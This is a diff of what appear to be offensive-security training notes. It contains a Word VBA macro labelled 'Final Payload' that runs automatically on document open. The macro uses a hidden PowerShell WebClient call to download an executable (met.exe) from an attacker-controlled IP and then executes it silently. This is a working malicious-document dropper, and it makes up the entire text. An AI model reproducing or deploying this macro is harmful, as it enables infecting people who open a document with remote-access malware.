@@ -32,26 +32,32 @@ exePath = ActiveDocument.Path + "\msfstaged.exe"
 # Final Payload
 
 Sub Document_Open()
-MyMacro
+    MyMacro
 End Sub
+
 Sub AutoOpen()
-MyMacro
+    MyMacro
 End Sub
+
 Sub MyMacro()
-Dim str As String
-str = "powershell (new-object System.Net.WebClient).Downloadfile('http://192.168.45.218/word.exe','word.exe')"
-Shell str, vbHide
-Dim exePath As String
-exePath = ActiveDocument.Path + "\word.exe"
-Wait (2)
-Shell exePath, vbHide
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.232/met.exe', 'met.exe')"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveDocument.Path + "\met.exe"
+    Wait (2)
+    Shell exePath, vbHide
+
 End Sub
+
 Sub Wait(n As Long)
-Dim t As Date
-t = Now
-Do
-DoEvents
-Loop Until Now >= DateAdd("s", n, t)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
 End Sub
+
+
 
 
